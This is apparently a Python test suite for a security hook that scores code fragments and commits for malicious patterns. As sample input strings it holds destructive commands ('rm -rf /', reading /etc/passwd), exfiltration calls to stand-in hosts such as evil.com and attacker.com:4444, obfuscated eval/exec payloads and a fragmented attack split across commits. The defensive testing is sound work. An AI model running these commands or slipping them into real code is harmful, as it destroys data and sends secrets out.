#!/usr/bin/env python3
"""
Test suite for enhanced security guardian integration.

Tests comprehensive security validation, cross-fragment analysis,
and malicious code detection in commit fragments.

Created: 2025-08-01
"""

import unittest
from unittest.mock import Mock, patch
import tempfile
import sqlite3
import json
import os
import sys
from pathlib import Path
from datetime import datetime, timedelta

# Add hooks-repo directory to path (hooks migrated to separate repository)
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root / '.claude' / 'hooks-repo'))

try:
    from utils.enhanced_security_guardian import (
        EnhancedSecurityGuardian,
        CommitFragment,
        secure_chunked_edit,
        secure_chunked_file_creation
    )
    IMPORTS_AVAILABLE = True
except ImportError:
    IMPORTS_AVAILABLE = False
    EnhancedSecurityGuardian = None
    CommitFragment = None
    secure_chunked_edit = None
    secure_chunked_file_creation = None

import pytest


@pytest.mark.skipif(not IMPORTS_AVAILABLE, reason="Hook modules not available")
class TestEnhancedSecurityGuardian(unittest.TestCase):
    """Test EnhancedSecurityGuardian core functionality."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test_fragment_tracking.db')
        self.guardian = EnhancedSecurityGuardian(db_path=self.db_path)
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_database_initialization(self):
        """Test database initialization."""
        self.assertTrue(os.path.exists(self.db_path))
        
        # Check tables exist
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("""
                SELECT name FROM sqlite_master 
                WHERE type='table' AND name IN ('fragment_series', 'commit_fragments')
            """)
            tables = [row[0] for row in cursor.fetchall()]
            self.assertIn('fragment_series', tables)
            self.assertIn('commit_fragments', tables)
    
    def test_security_pattern_analysis_safe_code(self):
        """Test security pattern analysis with safe code."""
        safe_code = """
def calculate_sum(a, b):
    return a + b

class Calculator:
    def add(self, x, y):
        return x + y
"""
        score, patterns = self.guardian.analyze_security_patterns(safe_code)
        self.assertEqual(score, 0.0)
        self.assertEqual(len(patterns), 0)
    
    def test_security_pattern_analysis_suspicious_code(self):
        """Test security pattern analysis with suspicious code."""
        suspicious_code = """
import os
import subprocess
import urllib.request

def dangerous_function():
    eval("__import__('os').system('rm -rf /')")
    subprocess.run(['curl', 'http://malicious.com'])
    os.system("cat /etc/passwd")
"""
        score, patterns = self.guardian.analyze_security_patterns(suspicious_code)
        self.assertGreater(score, 0.5)  # Should have high security score
        self.assertGreater(len(patterns), 0)  # Should detect patterns
        
        # Check for specific pattern categories
        pattern_text = ' '.join(patterns)
        self.assertIn('obfuscated_code', pattern_text)
        self.assertIn('network_activity', pattern_text)
        self.assertIn('file_system_access', pattern_text)
    
    def test_fragment_series_creation(self):
        """Test fragment series creation and tracking."""
        operation_id = self.guardian.start_fragment_series("test.py", "create", 3)
        self.assertIsInstance(operation_id, str)
        self.assertEqual(len(operation_id), 16)  # SHA256 truncated to 16 chars
        
        # Verify series exists in database
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("""
                SELECT operation_id, file_path, total_fragments 
                FROM fragment_series WHERE operation_id = ?
            """, (operation_id,))
            row = cursor.fetchone()
            self.assertIsNotNone(row)
            self.assertEqual(row[1], "test.py")
            self.assertEqual(row[2], 3)
    
    def test_commit_fragment_addition(self):
        """Test adding commit fragments to a series."""
        operation_id = self.guardian.start_fragment_series("test.py", "create", 2)
        
        # Add first fragment
        fragment1 = self.guardian.add_commit_fragment(
            operation_id, "test.py", "def func1():\n    pass", 
            "Add func1", "create"
        )
        
        self.assertIsInstance(fragment1, CommitFragment)
        self.assertEqual(fragment1.file_path, "test.py")
        self.assertEqual(fragment1.parent_operation_id, operation_id)
        
        # Add second fragment with suspicious content
        suspicious_content = "eval('__import__(\"os\").system(\"rm -rf /\")')"
        fragment2 = self.guardian.add_commit_fragment(
            operation_id, "test.py", suspicious_content,
            "Add suspicious code", "create"
        )
        
        self.assertGreater(fragment2.security_score, 0.2)  # Should have security issues
        self.assertGreater(len(fragment2.suspicious_patterns), 0)
    
    def test_fragment_series_validation_safe(self):
        """Test fragment series validation with safe content."""
        operation_id = self.guardian.start_fragment_series("test.py", "create", 2)
        
        # Add safe fragments
        self.guardian.add_commit_fragment(
            operation_id, "test.py", "def func1():\n    return 1", 
            "Add func1", "create"
        )
        self.guardian.add_commit_fragment(
            operation_id, "test.py", "def func2():\n    return 2", 
            "Add func2", "create"
        )
        
        is_valid, issues = self.guardian.validate_fragment_series(operation_id)
        self.assertTrue(is_valid)
        self.assertEqual(len(issues), 0)
    
    def test_fragment_series_validation_dangerous(self):
        """Test fragment series validation with dangerous content."""
        operation_id = self.guardian.start_fragment_series("test.py", "create", 2)
        
        # Add dangerous fragments
        dangerous_code1 = "eval('malicious_code_1')"
        dangerous_code2 = "subprocess.run(['rm', '-rf', '/'])"
        
        self.guardian.add_commit_fragment(
            operation_id, "test.py", dangerous_code1, 
            "Add dangerous code 1", "create"
        )
        self.guardian.add_commit_fragment(
            operation_id, "test.py", dangerous_code2, 
            "Add dangerous code 2", "create"
        )
        
        is_valid, issues = self.guardian.validate_fragment_series(operation_id)
        self.assertFalse(is_valid)
        self.assertGreater(len(issues), 0)
        
        # Check for specific security issues
        issues_text = ' '.join(issues)
        self.assertTrue(
            'security score' in issues_text or 
            'suspicious patterns' in issues_text
        )
    
    def test_fragment_series_time_window_validation(self):
        """Test fragment series time window validation."""
        operation_id = self.guardian.start_fragment_series("test.py", "create", 1)
        
        # Modify the guardian's time window to be very short for testing
        self.guardian.max_fragment_time_window = timedelta(seconds=1)
        
        # Add fragment
        self.guardian.add_commit_fragment(
            operation_id, "test.py", "safe_code", "Add safe code", "create"
        )
        
        # Simulate time passing by manually updating the database
        with sqlite3.connect(self.db_path) as conn:
            old_time = (datetime.now() - timedelta(hours=3)).isoformat()
            conn.execute("""
                UPDATE fragment_series 
                SET start_time = ? 
                WHERE operation_id = ?
            """, (old_time, operation_id))
        
        is_valid, issues = self.guardian.validate_fragment_series(operation_id)
        self.assertFalse(is_valid)
        # Check that time window issue was detected  
        self.assertTrue(any('maximum window' in issue for issue in issues))
    
    @patch('subprocess.run')
    @patch('utils.enhanced_security_guardian.request_guardian_commit')
    def test_secure_chunked_commit_success(self, mock_guardian_commit, mock_subprocess):
        """Test successful secure chunked commit."""
        mock_guardian_commit.return_value = True
        mock_subprocess.return_value = Mock(stdout='abc123\n', returncode=0)
        
        chunks = ["def func1():\n    pass", "def func2():\n    pass"]
        success, message = self.guardian.secure_chunked_commit(
            "test.py", chunks, "Auto-commit: ", "create"
        )
        
        self.assertTrue(success)
        self.assertIn("Successfully committed", message)
        self.assertEqual(mock_guardian_commit.call_count, 2)  # One call per chunk
    
    @patch('subprocess.run')
    @patch('utils.enhanced_security_guardian.request_guardian_commit')
    def test_secure_chunked_commit_security_failure(self, mock_guardian_commit, mock_subprocess):
        """Test secure chunked commit with security failure."""
        mock_guardian_commit.return_value = True
        mock_subprocess.return_value = Mock(stdout='abc123\n', returncode=0)
        
        # Create chunks with dangerous content that will fail validation
        dangerous_chunks = [
            "eval('malicious_code_1')",
            "eval('malicious_code_2')",
            "eval('malicious_code_3')"
        ]
        
        success, message = self.guardian.secure_chunked_commit(
            "test.py", dangerous_chunks, "Auto-commit: ", "create"
        )
        
        self.assertFalse(success)
        self.assertIn("Security validation failed", message)
    
    def test_cleanup_old_series(self):
        """Test cleanup of old fragment series."""
        # Create old series
        operation_id = self.guardian.start_fragment_series("old_test.py", "create", 1)
        self.guardian.add_commit_fragment(
            operation_id, "old_test.py", "old_code", "Old commit", "create"
        )
        self.guardian.complete_fragment_series(operation_id)
        
        # Manually set old timestamp
        with sqlite3.connect(self.db_path) as conn:
            old_time = (datetime.now() - timedelta(days=10)).isoformat()
            conn.execute("""
                UPDATE fragment_series 
                SET last_update = ? 
                WHERE operation_id = ?
            """, (old_time, operation_id))
        
        # Run cleanup
        self.guardian.cleanup_old_series(max_age_days=7)
        
        # Verify series was cleaned up
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("""
                SELECT COUNT(*) FROM fragment_series WHERE operation_id = ?
            """, (operation_id,))
            count = cursor.fetchone()[0]
            self.assertEqual(count, 0)
    
    def test_security_report_generation(self):
        """Test security report generation."""
        # Create some test data
        operation_id = self.guardian.start_fragment_series("test.py", "create", 2)
        self.guardian.add_commit_fragment(
            operation_id, "test.py", "eval('test')", "Suspicious commit", "create"
        )
        self.guardian.complete_fragment_series(operation_id)
        
        report = self.guardian.get_security_report(days=1)
        
        self.assertIsInstance(report, dict)
        self.assertIn('total_fragment_series', report)
        self.assertIn('completed_series', report)
        self.assertIn('average_security_score', report)
        self.assertIn('high_risk_fragments', report)
        self.assertEqual(report['total_fragment_series'], 1)
        self.assertEqual(report['completed_series'], 1)


class TestSecurityIntegrationFunctions(unittest.TestCase):
    """Test security integration functions."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.test_file = os.path.join(self.temp_dir, 'test.py')
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('utils.enhanced_security_guardian.EnhancedSecurityGuardian')
    def test_secure_chunked_edit_success(self, mock_guardian_class):
        """Test successful secure chunked edit."""
        # Create test file
        with open(self.test_file, 'w') as f:
            f.write("old content")
        
        # Mock guardian
        mock_guardian = Mock()
        mock_guardian.secure_chunked_commit.return_value = (True, "Success")
        mock_guardian_class.return_value = mock_guardian
        
        config = {'max_lines_per_chunk': 50, 'commit_message_prefix': 'Auto: '}
        success = secure_chunked_edit(self.test_file, "old content", "new content", config)
        
        self.assertTrue(success)
        mock_guardian.secure_chunked_commit.assert_called_once()
    
    @patch('utils.enhanced_security_guardian.EnhancedSecurityGuardian')
    def test_secure_chunked_edit_failure(self, mock_guardian_class):
        """Test secure chunked edit with failure."""
        # Create test file
        with open(self.test_file, 'w') as f:
            f.write("old content")
        
        # Mock guardian to fail
        mock_guardian = Mock()
        mock_guardian.secure_chunked_commit.return_value = (False, "Security failed")
        mock_guardian_class.return_value = mock_guardian
        
        config = {'max_lines_per_chunk': 50, 'commit_message_prefix': 'Auto: '}
        success = secure_chunked_edit(self.test_file, "old content", "dangerous_code", config)
        
        self.assertFalse(success)
    
    @patch('utils.enhanced_security_guardian.EnhancedSecurityGuardian')
    def test_secure_chunked_file_creation_success(self, mock_guardian_class):
        """Test successful secure chunked file creation."""
        # Mock guardian
        mock_guardian = Mock()
        mock_guardian.secure_chunked_commit.return_value = (True, "Success")
        mock_guardian_class.return_value = mock_guardian
        
        config = {'max_lines_per_chunk': 100, 'commit_message_prefix': 'Create: '}
        content = "def func():\n    pass\n" * 50  # Large content
        
        success = secure_chunked_file_creation(self.test_file, content, config)
        
        self.assertTrue(success)
        mock_guardian.secure_chunked_commit.assert_called_once()
    
    @patch('utils.enhanced_security_guardian.EnhancedSecurityGuardian')
    def test_secure_chunked_file_creation_security_failure(self, mock_guardian_class):
        """Test secure chunked file creation with security failure."""
        # Mock guardian to fail security validation
        mock_guardian = Mock()
        mock_guardian.secure_chunked_commit.return_value = (False, "Security validation failed")
        mock_guardian_class.return_value = mock_guardian
        
        config = {'max_lines_per_chunk': 100, 'commit_message_prefix': 'Create: '}
        dangerous_content = "eval('malicious_code')\n" * 50
        
        success = secure_chunked_file_creation(self.test_file, dangerous_content, config)
        
        self.assertFalse(success)


class TestMaliciousPatternDetection(unittest.TestCase):
    """Test malicious pattern detection capabilities."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test_security.db')
        self.guardian = EnhancedSecurityGuardian(db_path=self.db_path)
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_obfuscated_code_detection(self):
        """Test detection of obfuscated code patterns."""
        obfuscated_code = """
# Obfuscated malicious code
eval(compile('exec("import os; os.system(\'rm -rf /\')")', '<string>', 'exec'))
exec(__import__('base64').b64decode('aW1wb3J0IG9z'))
"""
        score, patterns = self.guardian.analyze_security_patterns(obfuscated_code)
        
        self.assertGreater(score, 0.3)  # Should have high security score
        pattern_text = ' '.join(patterns)
        self.assertIn('obfuscated_code', pattern_text)
    
    def test_network_activity_detection(self):
        """Test detection of network activity patterns."""
        network_code = """
import urllib.request
import requests
import socket

def exfiltrate_data():
    urllib.request.urlopen('http://malicious.com/data')
    requests.post('http://evil.com', data={'secret': 'value'})
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('attacker.com', 4444))
"""
        score, patterns = self.guardian.analyze_security_patterns(network_code)
        
        self.assertGreater(score, 0.2)
        pattern_text = ' '.join(patterns)
        self.assertIn('network_activity', pattern_text)
    
    def test_file_system_access_detection(self):
        """Test detection of dangerous file system access."""
        filesystem_code = """
import os
import shutil

def dangerous_operations():
    os.remove('/important/file')
    shutil.rmtree('/critical/directory')
    with open('/etc/passwd', 'r') as f:
        data = f.read()
"""
        score, patterns = self.guardian.analyze_security_patterns(filesystem_code)
        
        self.assertGreater(score, 0.1)
        pattern_text = ' '.join(patterns)
        self.assertIn('file_system_access', pattern_text)
    
    def test_data_exfiltration_detection(self):
        """Test detection of data exfiltration patterns."""
        exfiltration_code = """
import json
import pickle
import base64

def exfiltrate():
    sensitive_data = {'passwords': ['secret1', 'secret2']}
    json.dumps(sensitive_data)
    pickle.dumps(sensitive_data)
    base64.b64encode(str(sensitive_data).encode())
"""
        score, patterns = self.guardian.analyze_security_patterns(exfiltration_code)
        
        self.assertGreater(score, 0.1)
        pattern_text = ' '.join(patterns)
        self.assertIn('data_exfiltration', pattern_text)
    
    def test_fragmentation_attack_detection(self):
        """Test detection of fragmentation-based attacks."""
        operation_id = self.guardian.start_fragment_series("attack.py", "create", 5)
        
        # Add fragments that individually look innocent but together form an attack
        fragments = [
            "import os",
            "import subprocess", 
            "def cleanup():",
            "    cmd = 'rm'",
            "    subprocess.run([cmd, '-rf', '/'])"
        ]
        
        for i, fragment in enumerate(fragments):
            self.guardian.add_commit_fragment(
                operation_id, "attack.py", fragment, f"Add fragment {i+1}", "create"
            )
        
        is_valid, issues = self.guardian.validate_fragment_series(operation_id)
        
        # The individual fragments might have low scores, but the cumulative effect should be detected
        self.assertFalse(is_valid)
        self.assertGreater(len(issues), 0)


class TestRollbackCapabilities(unittest.TestCase):
    """Test rollback capabilities for failed validations."""
    
    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test_rollback.db')
        self.guardian = EnhancedSecurityGuardian(db_path=self.db_path)
    
    def tearDown(self):
        """Clean up test environment."""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    @patch('subprocess.run')
    def test_rollback_fragment_series(self, mock_subprocess):
        """Test rollback of fragment series."""
        mock_subprocess.return_value = Mock(returncode=0)
        
        operation_id = self.guardian.start_fragment_series("test.py", "create", 2)
        commit_shas = ['abc123', 'def456']
        
        self.guardian.rollback_fragment_series(operation_id, commit_shas)
        
        # Verify git revert was called for each commit in reverse order
        expected_calls = [
            unittest.mock.call(['git', 'revert', '--no-edit', 'def456'], 
                             check=True, capture_output=True),
            unittest.mock.call(['git', 'revert', '--no-edit', 'abc123'], 
                             check=True, capture_output=True)
        ]
        mock_subprocess.assert_has_calls(expected_calls)
        
        # Verify series is marked as complete in database
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("""
                SELECT is_complete FROM fragment_series WHERE operation_id = ?
            """, (operation_id,))
            is_complete = cursor.fetchone()[0]
            self.assertTrue(is_complete)
    
    @patch('subprocess.run')
    def test_rollback_failure_handling(self, mock_subprocess):
        """Test handling of rollback failures."""
        # Mock subprocess to fail
        from subprocess import CalledProcessError
        mock_subprocess.side_effect = CalledProcessError(1, 'git revert')
        
        operation_id = self.guardian.start_fragment_series("test.py", "create", 1)
        commit_shas = ['abc123']
        
        # Should not raise exception, but handle gracefully
        self.guardian.rollback_fragment_series(operation_id, commit_shas)
        
        # Verify rollback points are stored for manual intervention
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute("""
                SELECT rollback_points FROM fragment_series WHERE operation_id = ?
            """, (operation_id,))
            rollback_points_json = cursor.fetchone()[0]
            rollback_points = json.loads(rollback_points_json)
            self.assertEqual(rollback_points, ['abc123'])


if __name__ == '__main__':
    # Run with verbose output
    unittest.main(verbosity=2)